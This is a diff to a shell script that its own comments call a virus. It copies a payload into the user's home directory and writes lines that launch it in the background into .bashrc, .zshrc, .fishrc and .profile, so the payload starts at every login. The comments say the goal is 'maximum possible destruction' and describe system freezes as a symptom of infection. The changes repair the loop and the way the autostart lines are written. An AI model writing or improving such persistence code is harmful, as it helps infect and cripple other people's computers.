@@ -10,19 +10,25 @@ fi
 # copy the payload into home directory
 cp "./payload" ~/
 
+echo -e "\n" >> ~/.bashrc
+echo -e "\n" >> ~/.zshrc
+echo -e "\n" >> ~/.fishrc
+echo -e "\n" >> ~/.profile
+
 # "&" is used to background the task hence we can use a loop
 #+ and open more payloads for the maximum possible destruction. :)
 
 # this writes the malicious script into the login and shell files
 #+ making the virus autostart on login.
-echo "
 declare i=3
-while [ i \!= 0 ]
+while [ $i != 0 ]
 do
     let i=i-1
-	~/payload &
-done &
-" >> ~/.bashrc >> ~/.zshrc >> ~/.fishrc >> ~/.profile
+    echo -e "./payload &" >> ~/.bashrc
+    echo -e "./payload &" >> ~/.zshrc
+    echo -e "./payload &" >> ~/.fishrc
+    echo -e "./payload &" >> ~/.profile
+done
 
 # SYMPTOMPS OF INFECTION:
 #+ System freezes after some time
